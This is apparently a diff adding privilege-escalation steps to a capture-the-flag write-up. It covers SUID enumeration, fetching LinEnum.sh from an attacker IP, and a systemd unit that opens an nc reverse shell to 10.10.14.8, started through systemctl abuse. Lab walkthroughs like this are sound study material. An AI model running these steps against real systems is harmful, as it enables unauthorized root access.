@@ -77,3 +77,40 @@ sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
 ![image](https://user-images.githubusercontent.com/33616880/231977956-2ac3c680-de93-4e87-8b3c-91a432c7efa6.png)
 
 
+
+```
+find / -perm -4000 2>/dev/null
+```
+![image](https://user-images.githubusercontent.com/33616880/231979320-9e90787c-3b50-40e9-b92d-cd4009af4304.png)
+
+
+
+```
+wget 10.10.14.8/LinEnum.sh
+./LinEnum.sh
+```
+![image](https://user-images.githubusercontent.com/33616880/231979671-3ca30d26-3d40-412d-9cca-28b91cfaf839.png)
+![image](https://user-images.githubusercontent.com/33616880/231979698-96af9d79-761b-4c32-a848-0c182173242e.png)
+
+
+https://gtfobins.github.io/gtfobins/systemctl/
+```
+[Service]
+Type=notify
+ExecStart=/bin/bash -c 'nc -e /bin/bash 10.10.14.8 443'
+KillMode=process
+Restart=on-failure
+RestartSec=42s
+
+[Install]
+WantedBy=multi-user.target
+```
+```
+systemctl link /home/pepper/pwn.service
+systemctl start pwn
+```
+![image](https://user-images.githubusercontent.com/33616880/231983233-c91e3200-561c-4995-8062-6cec3de97037.png)
+![image](https://user-images.githubusercontent.com/33616880/231983256-1099084a-99c6-4477-a764-4c9530724f65.png)
+
+
+
